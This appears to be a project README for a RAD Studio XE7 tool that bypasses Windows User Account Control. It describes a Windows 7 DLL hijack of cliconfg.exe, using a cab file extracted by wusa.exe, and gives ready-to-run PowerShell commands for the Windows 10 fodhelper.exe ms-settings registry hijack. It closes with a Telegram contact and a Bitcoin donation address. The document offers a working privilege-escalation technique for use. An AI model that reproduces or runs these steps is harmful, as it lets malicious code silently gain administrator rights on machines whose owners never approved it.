<h1 align="center">Bypass-UAC Rad Studio XE7</h1>

Windows 7
Both Dlls (under 64 bits and 32 bits) will be packed into a .cab archive by a command from cmd with administrator rights
(Example: makecab "C:\dll\Win64\ntwdblib.dll" "C:\ntwdblib64.cab")
ntwdblib32.cab and ntwdblib64.cab are already written in the code as an array of strings, in the execonsole project
to translate the ntwdblib32.cab file into an array of strings, you can use the code from the conststring project
We use the process vulnerability from the white list "%systemroot%\system32\cliconfg.exe"
Programmatically, using the update installer "%systemroot%\system32\wusa.exe" (it is also in the windows white list)
(Example: wusa "%temp%\ntwdblib.cab" /quiet /extract:%systemroot%\system32\)
do unpacking ntwdblib64.cab or ntwdblib32.cab depending on bitness
to the directory "%systemroot%\system32\ntwdblib.dll"
We start the process "%systemroot%\system32\cliconfg.exe" with user rights, but considering that it is in the windows white list
it executes itself with administrator privileges and loads our dll library "%systemroot%\system32\ntwdblib.dll"
in connection with which it inherits administrator rights and is able to execute any PE file bypassing the UAC window.


Windows 10
We use the vulnerability of the process from the white list "fodhelper.exe"

powershell New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "path to our file" -Force
powershell New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
powershell Start-Process "fodhelper.exe"
powershell Remove-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Recurse -Force

-------
### Video
[![video](https://i.postimg.cc/rw9fmbs8/maxresdefault.jpg)](https://youtu.be/VKTAxeYmjFI)

-------

### Support
Telegram: @Official_Mr_Robot

BTC: 1PoieWSbe1A7o2nAuXE37ncQHnGqxcdhJc
